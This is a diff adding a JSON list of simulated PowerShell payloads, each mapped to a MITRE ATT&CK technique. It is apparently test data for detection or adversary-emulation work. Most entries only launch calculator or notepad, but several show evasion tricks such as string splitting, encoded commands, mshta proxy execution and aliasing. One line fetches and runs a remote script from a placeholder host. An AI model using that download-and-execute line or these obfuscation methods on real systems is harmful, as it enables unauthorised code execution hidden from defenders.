@@ -1,0 +1,64 @@
+{
+  "payloads": [
+    {
+      "command": "Start-Process calc.exe",
+      "technique": "Command and Scripting Interpreter: PowerShell",
+      "tactic": "Execution",
+      "id": "T1059.001"
+    },
+    {
+      "command": "Write-Output \"Simulated payload: Hello world\"",
+      "technique": "Command and Scripting Interpreter: PowerShell",
+      "tactic": "Execution",
+      "id": "T1059.001"
+    },
+    {
+      "command": "Invoke-Expression (\"W\"+\"ri\"+\"te-Output 'Obfuscated test'\")",
+      "technique": "Obfuscated Files or Information",
+      "tactic": "Defense Evasion",
+      "id": "T1027"
+    },
+    {
+      "command": "Start-Sleep -Seconds 3",
+      "technique": "Indicator Blocking",
+      "tactic": "Defense Evasion",
+      "id": "T1562.006"
+    },
+    {
+      "command": "$cmd = 'notepad'; Start-Process $cmd",
+      "technique": "Indirect Command Execution",
+      "tactic": "Execution",
+      "id": "T1202"
+    },
+    {
+      "command": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAYQBsAGMALgBlAHgAZQA=",
+      "technique": "Obfuscated Files or Information: Command Obfuscation",
+      "tactic": "Defense Evasion",
+      "id": "T1027.001"
+    },
+    {
+      "command": "Start-Process mshta.exe -ArgumentList \"javascript:eval('alert(\\\"LOLBIN test\\\")')\"",
+      "technique": "Signed Binary Proxy Execution: Mshta",
+      "tactic": "Execution",
+      "id": "T1218.005"
+    },
+    {
+      "command": "$cmd = ('c'+'a'+'l'+'c'+'.'+'e'+'x'+'e'); Start-Process $cmd",
+      "technique": "Obfuscated Files or Information",
+      "tactic": "Defense Evasion",
+      "id": "T1027"
+    },
+    {
+      "command": "IEX (New-Object Net.WebClient).DownloadString('http://example.com/test.ps1')",
+      "technique": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "id": "T1105"
+    },
+    {
+      "command": "Set-Alias p Start-Process; p notepad.exe",
+      "technique": "Masquerading",
+      "tactic": "Defense Evasion",
+      "id": "T1036.003"
+    }
+  ]
+}
